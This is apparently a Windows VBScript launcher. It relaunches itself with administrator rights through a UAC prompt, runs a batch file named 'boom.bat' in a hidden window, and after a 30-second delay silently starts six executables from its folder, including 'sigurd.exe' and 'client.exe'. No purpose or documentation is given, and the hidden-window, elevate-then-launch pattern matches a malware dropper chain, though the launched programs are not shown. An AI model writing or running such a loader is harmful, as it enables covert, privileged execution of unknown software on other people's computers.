Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Set working directory to the current folder
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION ---
If Not WScript.Arguments.Named.Exists("elevate") Then
    ' Trigger UAC prompt. 0 = Hidden, 1 = Visible (use 1 for testing)
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

' --- STEP 2: START THE CHAIN ---
' Runs boom.bat completely hidden (0)

WshShell.Run "cmd.exe /c boom.bat", 0, True

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Wait 30 seconds for the system/internet to stabilize
WScript.Sleep 30000 

' Get the folder path
strPath = fso.GetParentFolderName(WScript.ScriptFullName)

' Run your files silently (0 = Hidden, False = Do not wait for app to exit)
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
